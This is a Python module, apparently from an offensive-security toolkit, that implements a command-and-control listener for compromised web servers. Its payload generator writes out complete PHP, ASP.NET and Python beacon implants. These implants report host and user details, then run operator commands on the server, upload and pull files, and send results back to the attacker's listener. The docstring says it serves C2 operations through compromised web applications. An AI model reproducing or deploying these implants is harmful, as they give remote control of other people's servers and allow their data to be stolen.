"""
Web-Based C2 Listener & Dashboard Extension
============================================

Advanced C2 listener operating through web shells:
- HTTP polling-based command & control
- Encrypted command transmission
- Multi-shell session management
- Web-based operator interface
- Stealth communication protocols

Author: ITherso
License: MIT
Impact: Enables C2 operations through compromised web applications
"""

import os
import json
import base64
import hashlib
import secrets
import uuid
import time
import threading
from datetime import datetime, timedelta
from enum import Enum
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Any, Tuple, Callable
from queue import Queue
from concurrent.futures import ThreadPoolExecutor
import logging
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

logger = logging.getLogger(__name__)


class SessionState(Enum):
    """Session states"""
    ACTIVE = "active"
    IDLE = "idle"
    LOST = "lost"
    DEAD = "dead"


class CommandType(Enum):
    """Command types"""
    EXEC = "exec"              # Execute system command
    UPLOAD = "upload"          # Upload file
    DOWNLOAD = "download"      # Download file
    SCRIPT = "script"          # Execute script
    MIGRATE = "migrate"        # Migrate to new shell
    PERSIST = "persist"        # Install persistence
    KILL = "kill"              # Kill session
    SLEEP = "sleep"            # Change sleep interval
    BEACON = "beacon"          # Deploy beacon
    PROXY = "proxy"            # Setup proxy
    SCREENSHOT = "screenshot"  # Take screenshot
    KEYLOG = "keylog"          # Start keylogger
    EXFIL = "exfil"            # Exfiltrate data


class ProtocolType(Enum):
    """Communication protocols"""
    HTTP_POLL = "http_poll"        # Standard HTTP polling
    HTTP_LONG_POLL = "http_long_poll"  # Long polling
    DNS_TUNNEL = "dns_tunnel"      # DNS tunneling
    WEBSOCKET = "websocket"        # WebSocket
    HTTP_SMUGGLE = "http_smuggle"  # HTTP smuggling
    CUSTOM_HEADER = "custom_header"  # Custom header encoding


@dataclass
class C2Config:
    """C2 Configuration"""
    listener_id: str = ""
    listen_host: str = "0.0.0.0"
    listen_port: int = 8443
    protocol: ProtocolType = ProtocolType.HTTP_POLL
    encryption_key: str = ""
    beacon_interval: int = 30
    jitter: int = 10
    max_retries: int = 3
    timeout: int = 60
    user_agents: List[str] = field(default_factory=list)
    custom_headers: Dict[str, str] = field(default_factory=dict)
    
    def __post_init__(self):
        if not self.listener_id:
            self.listener_id = str(uuid.uuid4())[:8]
        if not self.encryption_key:
            self.encryption_key = Fernet.generate_key().decode()
        if not self.user_agents:
            self.user_agents = [
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
            ]


@dataclass
class WebShellSession:
    """Web shell session"""
    session_id: str = ""
    shell_url: str = ""
    shell_type: str = ""
    hostname: str = ""
    username: str = ""
    os_info: str = ""
    working_dir: str = ""
    state: SessionState = SessionState.ACTIVE
    last_seen: datetime = None
    created_at: datetime = None
    beacon_interval: int = 30
    encryption_key: str = ""
    metadata: Dict[str, Any] = field(default_factory=dict)
    
    def __post_init__(self):
        if not self.session_id:
            self.session_id = str(uuid.uuid4())[:8]
        if not self.created_at:
            self.created_at = datetime.now()
        if not self.last_seen:
            self.last_seen = datetime.now()


@dataclass
class C2Command:
    """C2 Command"""
    cmd_id: str = ""
    session_id: str = ""
    cmd_type: CommandType = CommandType.EXEC
    payload: str = ""
    args: Dict[str, Any] = field(default_factory=dict)
    status: str = "pending"
    result: str = ""
    created_at: datetime = None
    executed_at: datetime = None
    
    def __post_init__(self):
        if not self.cmd_id:
            self.cmd_id = str(uuid.uuid4())[:8]
        if not self.created_at:
            self.created_at = datetime.now()


@dataclass
class BeaconData:
    """Beacon check-in data"""
    session_id: str = ""
    hostname: str = ""
    username: str = ""
    os_info: str = ""
    working_dir: str = ""
    process_id: int = 0
    timestamp: datetime = None
    metadata: Dict[str, Any] = field(default_factory=dict)


class EncryptionManager:
    """
    Handle encryption/decryption for C2 communications
    """
    
    def __init__(self, key: str = None):
        if key:
            self.key = key.encode() if isinstance(key, str) else key
        else:
            self.key = Fernet.generate_key()
        self.cipher = Fernet(self.key)
    
    def encrypt(self, data: str) -> str:
        """Encrypt data"""
        encrypted = self.cipher.encrypt(data.encode())
        return base64.b64encode(encrypted).decode()
    
    def decrypt(self, data: str) -> str:
        """Decrypt data"""
        try:
            decoded = base64.b64decode(data.encode())
            decrypted = self.cipher.decrypt(decoded)
            return decrypted.decode()
        except Exception as e:
            logger.error(f"Decryption failed: {e}")
            return ""
    
    @classmethod
    def derive_key(cls, password: str, salt: bytes = None) -> Tuple[str, bytes]:
        """Derive encryption key from password"""
        if not salt:
            salt = os.urandom(16)
        
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=100000
        )
        
        key = base64.urlsafe_b64encode(kdf.derive(password.encode()))
        return key.decode(), salt


class WebShellManager:
    """
    Manage web shell sessions
    """
    
    def __init__(self, config: C2Config):
        self.config = config
        self.sessions: Dict[str, WebShellSession] = {}
        self.encryption = EncryptionManager(config.encryption_key)
    
    def register_session(self, shell_url: str, shell_type: str = "php",
                        metadata: Dict = None) -> WebShellSession:
        """Register new web shell session"""
        
        session = WebShellSession(
            shell_url=shell_url,
            shell_type=shell_type,
            encryption_key=self.config.encryption_key,
            beacon_interval=self.config.beacon_interval,
            metadata=metadata or {}
        )
        
        self.sessions[session.session_id] = session
        logger.info(f"Registered session {session.session_id}: {shell_url}")
        
        return session
    
    def update_session(self, session_id: str, beacon_data: BeaconData) -> bool:
        """Update session from beacon"""
        
        if session_id not in self.sessions:
            return False
        
        session = self.sessions[session_id]
        session.hostname = beacon_data.hostname
        session.username = beacon_data.username
        session.os_info = beacon_data.os_info
        session.working_dir = beacon_data.working_dir
        session.last_seen = datetime.now()
        session.state = SessionState.ACTIVE
        session.metadata.update(beacon_data.metadata)
        
        return True
    
    def get_session(self, session_id: str) -> Optional[WebShellSession]:
        """Get session by ID"""
        return self.sessions.get(session_id)
    
    def list_sessions(self) -> List[WebShellSession]:
        """List all sessions"""
        return list(self.sessions.values())
    
    def check_session_health(self) -> None:
        """Check and update session health"""
        
        now = datetime.now()
        
        for session in self.sessions.values():
            if session.state == SessionState.DEAD:
                continue
            
            time_since_beacon = (now - session.last_seen).total_seconds()
            
            # Calculate expected interval with jitter
            expected = session.beacon_interval * 2
            
            if time_since_beacon > expected * 3:
                session.state = SessionState.DEAD
            elif time_since_beacon > expected * 2:
                session.state = SessionState.LOST
            elif time_since_beacon > expected:
                session.state = SessionState.IDLE
            else:
                session.state = SessionState.ACTIVE
    
    def remove_session(self, session_id: str) -> bool:
        """Remove session"""
        if session_id in self.sessions:
            del self.sessions[session_id]
            return True
        return False


class CommandQueue:
    """
    Command queue manager
    """
    
    def __init__(self):
        self.queues: Dict[str, Queue] = {}  # session_id -> Queue
        self.history: List[C2Command] = []
        self.results: Dict[str, C2Command] = {}  # cmd_id -> Command
    
    def create_queue(self, session_id: str) -> None:
        """Create queue for session"""
        if session_id not in self.queues:
            self.queues[session_id] = Queue()
    
    def queue_command(self, command: C2Command) -> str:
        """Queue command for session"""
        
        session_id = command.session_id
        
        if session_id not in self.queues:
            self.create_queue(session_id)
        
        self.queues[session_id].put(command)
        self.history.append(command)
        self.results[command.cmd_id] = command
        
        logger.info(f"Queued command {command.cmd_id} for session {session_id}")
        
        return command.cmd_id
    
    def get_pending_command(self, session_id: str) -> Optional[C2Command]:
        """Get next pending command for session"""
        
        if session_id not in self.queues:
            return None
        
        queue = self.queues[session_id]
        
        if queue.empty():
            return None
        
        return queue.get()
    
    def update_result(self, cmd_id: str, result: str, 
                     status: str = "completed") -> bool:
        """Update command result"""
        
        if cmd_id not in self.results:
            return False
        
        command = self.results[cmd_id]
        command.result = result
        command.status = status
        command.executed_at = datetime.now()
        
        return True
    
    def get_command(self, cmd_id: str) -> Optional[C2Command]:
        """Get command by ID"""
        return self.results.get(cmd_id)
    
    def get_history(self, session_id: str = None, 
                   limit: int = 100) -> List[C2Command]:
        """Get command history"""
        
        if session_id:
            history = [c for c in self.history if c.session_id == session_id]
        else:
            history = self.history
        
        return history[-limit:]


class PayloadGenerator:
    """
    Generate shell payloads for C2 operations
    """
    
    @staticmethod
    def generate_php_beacon(config: C2Config, session_id: str) -> str:
        """Generate PHP beacon payload"""
        
        return f'''<?php
// C2 Beacon - Session: {session_id}
@error_reporting(0);
@set_time_limit(0);

$c2_url = "{config.listen_host}:{config.listen_port}";
$session_id = "{session_id}";
$enc_key = "{config.encryption_key}";
$interval = {config.beacon_interval};
$jitter = {config.jitter};

function encrypt_data($data, $key) {{
    $iv = random_bytes(16);
    $encrypted = openssl_encrypt($data, 'AES-256-CBC', $key, OPENSSL_RAW_DATA, $iv);
    return base64_encode($iv . $encrypted);
}}

function decrypt_data($data, $key) {{
    $raw = base64_decode($data);
    $iv = substr($raw, 0, 16);
    $encrypted = substr($raw, 16);
    return openssl_decrypt($encrypted, 'AES-256-CBC', $key, OPENSSL_RAW_DATA, $iv);
}}

function beacon() {{
    global $c2_url, $session_id, $enc_key;
    
    $data = json_encode(array(
        'session_id' => $session_id,
        'hostname' => gethostname(),
        'username' => get_current_user(),
        'os_info' => php_uname(),
        'working_dir' => getcwd(),
        'process_id' => getmypid(),
        'timestamp' => time()
    ));
    
    $encrypted = encrypt_data($data, $enc_key);
    
    $ctx = stream_context_create(array(
        'http' => array(
            'method' => 'POST',
            'header' => "Content-Type: application/json\\r\\n" .
                       "X-Session-ID: $session_id\\r\\n",
            'content' => json_encode(array('data' => $encrypted)),
            'timeout' => 30
        )
    ));
    
    $response = @file_get_contents("http://$c2_url/beacon", false, $ctx);
    
    if ($response) {{
        $resp_data = json_decode($response, true);
        if (isset($resp_data['command'])) {{
            $cmd_data = decrypt_data($resp_data['command'], $enc_key);
            return json_decode($cmd_data, true);
        }}
    }}
    
    return null;
}}

function execute_command($cmd) {{
    global $c2_url, $session_id, $enc_key;
    
    $output = '';
    $cmd_type = $cmd['type'] ?? 'exec';
    $payload = $cmd['payload'] ?? '';
    $cmd_id = $cmd['cmd_id'] ?? '';
    
    switch($cmd_type) {{
        case 'exec':
            if(function_exists('system')) {{
                ob_start();
                @system($payload);
                $output = ob_get_clean();
            }} elseif(function_exists('shell_exec')) {{
                $output = @shell_exec($payload);
            }} elseif(function_exists('exec')) {{
                @exec($payload, $out);
                $output = implode("\\n", $out);
            }} elseif(function_exists('passthru')) {{
                ob_start();
                @passthru($payload);
                $output = ob_get_clean();
            }}
            break;
            
        case 'upload':
            $path = $cmd['args']['path'] ?? '/tmp/uploaded';
            $content = base64_decode($cmd['args']['content'] ?? '');
            $output = @file_put_contents($path, $content) ? 'Upload successful' : 'Upload failed';
            break;
            
        case 'download':
            $path = $cmd['args']['path'] ?? '';
            if(file_exists($path)) {{
                $output = base64_encode(file_get_contents($path));
            }} else {{
                $output = 'File not found';
            }}
            break;
            
        case 'sleep':
            global $interval;
            $interval = intval($payload);
            $output = "Sleep interval changed to $interval";
            break;
            
        case 'kill':
            exit(0);
            break;
    }}
    
    // Send result back
    $result_data = json_encode(array(
        'cmd_id' => $cmd_id,
        'output' => $output,
        'status' => 'completed'
    ));
    
    $encrypted = encrypt_data($result_data, $enc_key);
    
    $ctx = stream_context_create(array(
        'http' => array(
            'method' => 'POST',
            'header' => "Content-Type: application/json\\r\\n" .
                       "X-Session-ID: $session_id\\r\\n",
            'content' => json_encode(array('data' => $encrypted))
        )
    ));
    
    @file_get_contents("http://$c2_url/result", false, $ctx);
}}

// Main beacon loop
while(true) {{
    $cmd = beacon();
    
    if($cmd) {{
        execute_command($cmd);
    }}
    
    $sleep_time = $interval + rand(-$jitter, $jitter);
    sleep(max(1, $sleep_time));
}}
?>'''
    
    @staticmethod
    def generate_asp_beacon(config: C2Config, session_id: str) -> str:
        """Generate ASP.NET beacon payload"""
        
        return f'''<%@ Page Language="C#" %>
<%@ Import Namespace="System.Net" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Text" %>
<%@ Import Namespace="System.Security.Cryptography" %>
<script runat="server">
// C2 Beacon - Session: {session_id}

string c2Url = "http://{config.listen_host}:{config.listen_port}";
string sessionId = "{session_id}";
string encKey = "{config.encryption_key}";
int interval = {config.beacon_interval};

protected void Page_Load(object sender, EventArgs e)
{{
    while(true)
    {{
        var cmd = Beacon();
        if(cmd != null)
        {{
            ExecuteCommand(cmd);
        }}
        System.Threading.Thread.Sleep(interval * 1000);
    }}
}}

private Dictionary<string, object> Beacon()
{{
    try
    {{
        var data = new Dictionary<string, object>
        {{
            {{"session_id", sessionId}},
            {{"hostname", Environment.MachineName}},
            {{"username", Environment.UserName}},
            {{"os_info", Environment.OSVersion.ToString()}},
            {{"working_dir", Environment.CurrentDirectory}},
            {{"timestamp", DateTime.UtcNow.ToString("o")}}
        }};
        
        using(var client = new WebClient())
        {{
            client.Headers.Add("Content-Type", "application/json");
            client.Headers.Add("X-Session-ID", sessionId);
            
            var json = new System.Web.Script.Serialization.JavaScriptSerializer().Serialize(data);
            var response = client.UploadString(c2Url + "/beacon", json);
            
            var respData = new System.Web.Script.Serialization.JavaScriptSerializer()
                .Deserialize<Dictionary<string, object>>(response);
            
            if(respData.ContainsKey("command"))
            {{
                return new System.Web.Script.Serialization.JavaScriptSerializer()
                    .Deserialize<Dictionary<string, object>>(respData["command"].ToString());
            }}
        }}
    }}
    catch {{ }}
    
    return null;
}}

private void ExecuteCommand(Dictionary<string, object> cmd)
{{
    var cmdType = cmd.ContainsKey("type") ? cmd["type"].ToString() : "exec";
    var payload = cmd.ContainsKey("payload") ? cmd["payload"].ToString() : "";
    var cmdId = cmd.ContainsKey("cmd_id") ? cmd["cmd_id"].ToString() : "";
    
    string output = "";
    
    switch(cmdType)
    {{
        case "exec":
            var psi = new System.Diagnostics.ProcessStartInfo("cmd", "/c " + payload)
            {{
                RedirectStandardOutput = true,
                UseShellExecute = false,
                CreateNoWindow = true
            }};
            using(var proc = System.Diagnostics.Process.Start(psi))
            {{
                output = proc.StandardOutput.ReadToEnd();
            }}
            break;
    }}
    
    // Send result
    SendResult(cmdId, output);
}}

private void SendResult(string cmdId, string output)
{{
    using(var client = new WebClient())
    {{
        client.Headers.Add("Content-Type", "application/json");
        client.Headers.Add("X-Session-ID", sessionId);
        
        var data = new Dictionary<string, object>
        {{
            {{"cmd_id", cmdId}},
            {{"output", output}},
            {{"status", "completed"}}
        }};
        
        var json = new System.Web.Script.Serialization.JavaScriptSerializer().Serialize(data);
        client.UploadString(c2Url + "/result", json);
    }}
}}
</script>'''
    
    @staticmethod
    def generate_python_beacon(config: C2Config, session_id: str) -> str:
        """Generate Python beacon payload"""
        
        return f'''#!/usr/bin/env python3
# C2 Beacon - Session: {session_id}

import os
import sys
import json
import time
import base64
import socket
import random
import platform
import subprocess
import urllib.request
import urllib.error

C2_URL = "http://{config.listen_host}:{config.listen_port}"
SESSION_ID = "{session_id}"
ENC_KEY = "{config.encryption_key}"
INTERVAL = {config.beacon_interval}
JITTER = {config.jitter}

def beacon():
    """Send beacon to C2"""
    try:
        data = {{
            'session_id': SESSION_ID,
            'hostname': socket.gethostname(),
            'username': os.getlogin() if hasattr(os, 'getlogin') else os.environ.get('USER', 'unknown'),
            'os_info': platform.platform(),
            'working_dir': os.getcwd(),
            'process_id': os.getpid(),
            'timestamp': int(time.time())
        }}
        
        req = urllib.request.Request(
            C2_URL + '/beacon',
            data=json.dumps(data).encode(),
            headers={{
                'Content-Type': 'application/json',
                'X-Session-ID': SESSION_ID
            }}
        )
        
        with urllib.request.urlopen(req, timeout=30) as resp:
            resp_data = json.loads(resp.read().decode())
            if 'command' in resp_data:
                return resp_data['command']
    except Exception as e:
        pass
    
    return None

def execute_command(cmd):
    """Execute command from C2"""
    cmd_type = cmd.get('type', 'exec')
    payload = cmd.get('payload', '')
    cmd_id = cmd.get('cmd_id', '')
    args = cmd.get('args', {{}})
    
    output = ''
    
    if cmd_type == 'exec':
        try:
            result = subprocess.run(
                payload,
                shell=True,
                capture_output=True,
                text=True,
                timeout=60
            )
            output = result.stdout + result.stderr
        except Exception as e:
            output = str(e)
    
    elif cmd_type == 'upload':
        path = args.get('path', '/tmp/uploaded')
        content = base64.b64decode(args.get('content', ''))
        try:
            with open(path, 'wb') as f:
                f.write(content)
            output = 'Upload successful'
        except Exception as e:
            output = f'Upload failed: {{e}}'
    
    elif cmd_type == 'download':
        path = args.get('path', '')
        try:
            with open(path, 'rb') as f:
                output = base64.b64encode(f.read()).decode()
        except Exception as e:
            output = f'Download failed: {{e}}'
    
    elif cmd_type == 'sleep':
        global INTERVAL
        INTERVAL = int(payload)
        output = f'Sleep interval changed to {{INTERVAL}}'
    
    elif cmd_type == 'kill':
        sys.exit(0)
    
    # Send result
    send_result(cmd_id, output)

def send_result(cmd_id, output):
    """Send command result to C2"""
    try:
        data = {{
            'cmd_id': cmd_id,
            'output': output,
            'status': 'completed'
        }}
        
        req = urllib.request.Request(
            C2_URL + '/result',
            data=json.dumps(data).encode(),
            headers={{
                'Content-Type': 'application/json',
                'X-Session-ID': SESSION_ID
            }}
        )
        
        urllib.request.urlopen(req, timeout=30)
    except:
        pass

def main():
    """Main beacon loop"""
    while True:
        cmd = beacon()
        
        if cmd:
            execute_command(cmd)
        
        sleep_time = INTERVAL + random.randint(-JITTER, JITTER)
        time.sleep(max(1, sleep_time))

if __name__ == '__main__':
    main()
'''


class WebC2Listener:
    """
    Main Web C2 Listener
    Orchestrates all C2 operations
    """
    
    def __init__(self, config: C2Config = None):
        self.config = config or C2Config()
        self.shell_manager = WebShellManager(self.config)
        self.command_queue = CommandQueue()
        self.payload_generator = PayloadGenerator()
        self.encryption = EncryptionManager(self.config.encryption_key)
        self.running = False
        self.stats = {
            'sessions_total': 0,
            'commands_executed': 0,
            'data_transferred': 0
        }
    
    def start(self) -> bool:
        """Start the C2 listener"""
        self.running = True
        logger.info(f"C2 Listener started on {self.config.listen_host}:{self.config.listen_port}")
        return True
    
    def stop(self) -> bool:
        """Stop the C2 listener"""
        self.running = False
        logger.info("C2 Listener stopped")
        return True
    
    def register_shell(self, shell_url: str, shell_type: str = "php",
                      metadata: Dict = None) -> Dict[str, Any]:
        """Register a new web shell"""
        
        session = self.shell_manager.register_session(shell_url, shell_type, metadata)
        self.command_queue.create_queue(session.session_id)
        self.stats['sessions_total'] += 1
        
        # Generate beacon payload
        beacon_payload = ""
        if shell_type == "php":
            beacon_payload = self.payload_generator.generate_php_beacon(
                self.config, session.session_id
            )
        elif shell_type == "asp":
            beacon_payload = self.payload_generator.generate_asp_beacon(
                self.config, session.session_id
            )
        elif shell_type == "python":
            beacon_payload = self.payload_generator.generate_python_beacon(
                self.config, session.session_id
            )
        
        return {
            'session_id': session.session_id,
            'shell_url': shell_url,
            'shell_type': shell_type,
            'beacon_payload': beacon_payload,
            'encryption_key': session.encryption_key
        }
    
    def handle_beacon(self, session_id: str, beacon_data: Dict) -> Dict[str, Any]:
        """Handle beacon check-in from shell"""
        
        # Update session
        data = BeaconData(
            session_id=session_id,
            hostname=beacon_data.get('hostname', ''),
            username=beacon_data.get('username', ''),
            os_info=beacon_data.get('os_info', ''),
            working_dir=beacon_data.get('working_dir', ''),
            process_id=beacon_data.get('process_id', 0),
            timestamp=datetime.now(),
            metadata=beacon_data.get('metadata', {})
        )
        
        self.shell_manager.update_session(session_id, data)
        
        # Check for pending command
        command = self.command_queue.get_pending_command(session_id)
        
        response = {'status': 'ok'}
        
        if command:
            # Encrypt command for transmission
            cmd_data = {
                'cmd_id': command.cmd_id,
                'type': command.cmd_type.value,
                'payload': command.payload,
                'args': command.args
            }
            response['command'] = self.encryption.encrypt(json.dumps(cmd_data))
        
        return response
    
    def handle_result(self, session_id: str, result_data: Dict) -> Dict[str, Any]:
        """Handle command result from shell"""
        
        cmd_id = result_data.get('cmd_id', '')
        output = result_data.get('output', '')
        status = result_data.get('status', 'completed')
        
        if cmd_id:
            self.command_queue.update_result(cmd_id, output, status)
            self.stats['commands_executed'] += 1
            self.stats['data_transferred'] += len(output)
        
        return {'status': 'ok'}
    
    def send_command(self, session_id: str, cmd_type: str, 
                    payload: str, args: Dict = None) -> str:
        """Send command to shell"""
        
        command = C2Command(
            session_id=session_id,
            cmd_type=CommandType(cmd_type),
            payload=payload,
            args=args or {}
        )
        
        cmd_id = self.command_queue.queue_command(command)
        
        return cmd_id
    
    def get_sessions(self) -> List[Dict[str, Any]]:
        """Get all sessions"""
        
        self.shell_manager.check_session_health()
        
        return [
            {
                'session_id': s.session_id,
                'shell_url': s.shell_url,
                'shell_type': s.shell_type,
                'hostname': s.hostname,
                'username': s.username,
                'os_info': s.os_info,
                'working_dir': s.working_dir,
                'state': s.state.value,
                'last_seen': s.last_seen.isoformat() if s.last_seen else None,
                'created_at': s.created_at.isoformat() if s.created_at else None,
                'beacon_interval': s.beacon_interval
            }
            for s in self.shell_manager.list_sessions()
        ]
    
    def get_session(self, session_id: str) -> Optional[Dict[str, Any]]:
        """Get specific session"""
        
        session = self.shell_manager.get_session(session_id)
        if not session:
            return None
        
        return {
            'session_id': session.session_id,
            'shell_url': session.shell_url,
            'shell_type': session.shell_type,
            'hostname': session.hostname,
            'username': session.username,
            'os_info': session.os_info,
            'working_dir': session.working_dir,
            'state': session.state.value,
            'last_seen': session.last_seen.isoformat() if session.last_seen else None,
            'created_at': session.created_at.isoformat() if session.created_at else None,
            'beacon_interval': session.beacon_interval,
            'metadata': session.metadata
        }
    
    def get_command_history(self, session_id: str = None, 
                           limit: int = 100) -> List[Dict[str, Any]]:
        """Get command history"""
        
        history = self.command_queue.get_history(session_id, limit)
        
        return [
            {
                'cmd_id': c.cmd_id,
                'session_id': c.session_id,
                'cmd_type': c.cmd_type.value,
                'payload': c.payload,
                'status': c.status,
                'result': c.result[:500] if c.result else '',  # Truncate long results
                'created_at': c.created_at.isoformat() if c.created_at else None,
                'executed_at': c.executed_at.isoformat() if c.executed_at else None
            }
            for c in history
        ]
    
    def get_command_result(self, cmd_id: str) -> Optional[Dict[str, Any]]:
        """Get command result"""
        
        command = self.command_queue.get_command(cmd_id)
        if not command:
            return None
        
        return {
            'cmd_id': command.cmd_id,
            'session_id': command.session_id,
            'cmd_type': command.cmd_type.value,
            'payload': command.payload,
            'status': command.status,
            'result': command.result,
            'created_at': command.created_at.isoformat() if command.created_at else None,
            'executed_at': command.executed_at.isoformat() if command.executed_at else None
        }
    
    def remove_session(self, session_id: str) -> bool:
        """Remove session"""
        return self.shell_manager.remove_session(session_id)
    
    def get_shell_types(self) -> List[Dict[str, str]]:
        """Get supported shell types"""
        return [
            {'id': 'php', 'name': 'PHP', 'extension': '.php'},
            {'id': 'asp', 'name': 'ASP.NET', 'extension': '.aspx'},
            {'id': 'python', 'name': 'Python', 'extension': '.py'},
            {'id': 'jsp', 'name': 'JSP', 'extension': '.jsp'},
        ]
    
    def get_command_types(self) -> List[Dict[str, str]]:
        """Get supported command types"""
        return [
            {'id': 'exec', 'name': 'Execute Command', 'description': 'Run system command'},
            {'id': 'upload', 'name': 'Upload File', 'description': 'Upload file to target'},
            {'id': 'download', 'name': 'Download File', 'description': 'Download file from target'},
            {'id': 'script', 'name': 'Execute Script', 'description': 'Run script on target'},
            {'id': 'sleep', 'name': 'Change Sleep', 'description': 'Modify beacon interval'},
            {'id': 'kill', 'name': 'Kill Session', 'description': 'Terminate beacon'},
        ]
    
    def get_stats(self) -> Dict[str, Any]:
        """Get C2 statistics"""
        
        sessions = self.shell_manager.list_sessions()
        
        return {
            'listener_id': self.config.listener_id,
            'running': self.running,
            'sessions_total': self.stats['sessions_total'],
            'sessions_active': len([s for s in sessions if s.state == SessionState.ACTIVE]),
            'sessions_idle': len([s for s in sessions if s.state == SessionState.IDLE]),
            'sessions_lost': len([s for s in sessions if s.state == SessionState.LOST]),
            'commands_executed': self.stats['commands_executed'],
            'data_transferred': self.stats['data_transferred'],
            'config': {
                'host': self.config.listen_host,
                'port': self.config.listen_port,
                'protocol': self.config.protocol.value,
                'beacon_interval': self.config.beacon_interval
            }
        }


# Factory function
def create_web_c2_listener(config: Dict = None) -> WebC2Listener:
    """Create Web C2 Listener instance"""
    
    if config:
        c2_config = C2Config(
            listen_host=config.get('listen_host', '0.0.0.0'),
            listen_port=config.get('listen_port', 8443),
            beacon_interval=config.get('beacon_interval', 30),
            jitter=config.get('jitter', 10)
        )
    else:
        c2_config = C2Config()
    
    return WebC2Listener(c2_config)


# Singleton instance
_web_c2_listener: Optional[WebC2Listener] = None

def get_web_c2_listener() -> WebC2Listener:
    """Get or create Web C2 Listener singleton"""
    global _web_c2_listener
    if _web_c2_listener is None:
        _web_c2_listener = create_web_c2_listener()
    return _web_c2_listener
